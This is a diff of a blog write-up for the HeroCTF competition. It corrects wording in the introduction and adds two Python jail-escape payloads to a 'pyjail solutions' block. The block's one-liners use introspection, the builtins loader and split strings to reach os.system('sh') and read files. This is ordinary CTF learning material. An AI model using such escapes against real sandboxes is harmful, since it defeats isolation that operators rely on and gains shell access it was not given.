@@ -6,7 +6,7 @@ tags: [web3, blockchain, PRNG, heap, LFSR]
 cover:
     image: 'HeroCTF_icon_500.png'
 ---
-Organized by the students of Engineering students in France, this was a nice CTF with an interesting variety of challenges. Unfortunately, I did not have much free time to play in the CTF this weekend. I was able to solve a few challenges, and came very close on a couple. While I didn't participate much, my CTF team did a great job and scored 10119 points, placing 9th in a global field of over 1000 teams
+Organized by Engineering students in France, this was a nice CTF with an interesting variety of challenges. Unfortunately, I did not have much free time to play in the CTF this weekend. I was able to solve a few challenges, and came very close on a couple. While I didn't participate much, my CTF team did a great job and scored 10119 points, placing 9th in a global field of over 1000 teams.
 
 <!--more-->
 ## Solves
@@ -284,6 +284,9 @@ The wrinkle is that it takes two 32-bit integers to generate each floating point
 #### pyjail solutions
 ```python
     >>> print("".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system']('sh'))
+    >>> print.__self__.setattr(print.__self__.credits, "_Printer__filenames", ["pyjail.py"]),print.__self__.credits()
+    >>> print(print.__self__.__loader__.load_module('bu''iltins').getattr(print.__self__.__loader__.load_module('o''s'),'sy''stem')('sh'))
+
 ```
 
 #### pyGulag solutions
